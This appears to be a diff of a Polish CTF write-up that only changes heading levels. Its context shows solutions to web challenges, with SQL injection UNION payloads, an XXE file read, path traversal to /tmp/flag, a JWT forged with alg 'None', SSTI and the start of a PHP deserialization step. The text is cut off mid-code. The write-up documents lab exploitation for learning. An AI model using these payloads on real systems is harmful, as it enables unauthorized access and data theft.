@@ -5,7 +5,7 @@ categories: [web]
 tags: [ctf]
 ---
 
-# 1 - Xcross this
+## 1 - Xcross this
 Po wejściu na stronę widzimy, że aplikacja pobiera od użytkownika dane, które potem wyświetla przy użyciu biblioteki MathJax ver. 2.7.0.
 ![alt text](/assets/posts/ctf_bgk/xcross_this1.png)
 
@@ -24,7 +24,7 @@ Na pierwszy rzut oka wygląda to jak base64 więc staram się to odszyfrować, o
 echo "VVRGU1IxZ3pkRlJrU0VsM1ltMWtTbUpyTVdoa1IyZzJWMWM1TVZGWVNteG1VVzg5Q2c9PQo=" | base64 -d | base64 -d | base64 -d
 ```
 
-# 2 - Cross site
+## 2 - Cross site
 Zadanie zostało prawdopodobnie wyłączone (nie udało mi się tam dostać), kod prowadzący do zadania 2:
 ```html
 <!--<li>
@@ -37,19 +37,19 @@ Zadanie zostało prawdopodobnie wyłączone (nie udało mi się tam dostać), ko
 </li>-->
 ```
 
-# 3 - Database
+## 3 - Database
 Po analizie kodu strony można zauważyć, że interesującym parametrem wydaje się być prametr ```?query=```.
 
 Spróbowałem podać kilka typowych znaków, które mogą wywołąć błąd zapytania i okazuje się, że baza danych jest podatna po podaniu znaku ```'```, otrzymujemy wówczas komunikat: ```SQLITE_ERROR```. A więc przejdźmy do szperania w bazie.
 
-## Sprawdzenie ilości kolumn
+### Sprawdzenie ilości kolumn
 Po kilku minutach testowania widzę, że baza jest podatna na SQLi za pomocą ```UNION```. Więc przejdę do sprawdzenia co zawiera tabela z ofertami. W tym celu użyję polecenia:
 ```sql
 test') UNION SELECT NULL,NULL,NULL,NULL--
 ```
 Oczywiście NULL, zwiększamy dopóki strona nie przestanie zwracać błędu, ilość NULLi informuje nas o liczbie kolumn w tabeli.
 
-## Ustalenie nazwy tabeli i kolumn
+### Ustalenie nazwy tabeli i kolumn
 ```sql
 test') UNION SELECT (SELECT sql FROM sqlite_master WHERE type!='meta' AND sql NOT NULL),NULL,NULL,NULL--
 ```
@@ -58,13 +58,13 @@ otrzymujemy odpowiedź:
 CREATE TABLE offers ( title TEXT, text TEXT, image TEXT, hidden BOOL )
 ```
 
-## Wyciągnięcie flagi
+### Wyciągnięcie flagi
 No to pozostało nam pobranie wszystkich ofert i znalezienie tej jednej ukrytej:
 ```sql
 XD') UNION SELECT title,text,image,hidden FROM offers--
 ```
 
-# 4 - External Entity
+## 4 - External Entity
 Widzimy, że flaga ukryta jest w pliku ```/tmp/flag``` i musimy użyć do tego XML. Jak sama nazwa zresztą nam sugeruje strona jest podatna na XEE (XML External Entity).
 ![alt text](/assets/posts/ctf_bgk/external_entity.png)
 
@@ -77,10 +77,10 @@ Zatem spróbujemy dostać się do pliku z flagą wykorzystując XEE:
 </creds>
 ```
 
-# 5 - deardir
+## 5 - deardir
 Po wejściu na strone dostajemy informacje o podaniu ścieżki w parametrze file, a jak zajrzymy w kod strony to widzimy, że flaga znowu jest ukryta w pliku ```/tmp/flag```. Jest to tradycyjny path traversal (```?file=../../../tmp/flag```).
 
-# 6 - I'm brOken'
+## 6 - I'm brOken'
 Widzimy panel logowania a w nim mamy podane dane logowania. Po zalogowaniu się strona ustawia nam ciasteczko session, podobne do tego:
 ![alt text](/assets/posts/ctf_bgk/im_broken.png)
 
@@ -100,7 +100,7 @@ eyJhbGciOiJOb25lIiwidHlwIjoiSldUIn0.eyJ1c2VybmFtZSI6ImFkbWluIiwiaWF0IjoxNzEyMTI5
 Podmieniam ciasteczko na stronie i... nic. 
 Okazuje się, że flaga jest ukryta w kodzie aplikacji, gdy wywołamy podatność to strona wygeneruje nam w HTML import pliku app.js i tutaj znajdziemy flagę.
 
-# 7 - Welcome, I, you
+## 7 - Welcome, I, you
 Strona mówi nam aby podać swoje imię jako część URI: ```/greeting/<imie>```.
 Z nagłówków HTTP wiem, że strona stoi na:
 ```HTTP
@@ -112,7 +112,7 @@ Tak więc spróbujmy coś tutaj wstrzyknąć. XSSa tutaj nie ma ale mamy SSTI (S
 
 Jak zrobimy ```ls -la``` to widzimy plik ```flag.txt```, który okazuje się być tym czego szukamy.
 
-# 8 - Why s0 deserious?
+## 8 - Why s0 deserious?
 No to tutaj spraw jest dużo prostsza wystarczy, że stworzymy sobie obiekt i wywołamy na nim funkcję serialize:
 ```php
 <?php
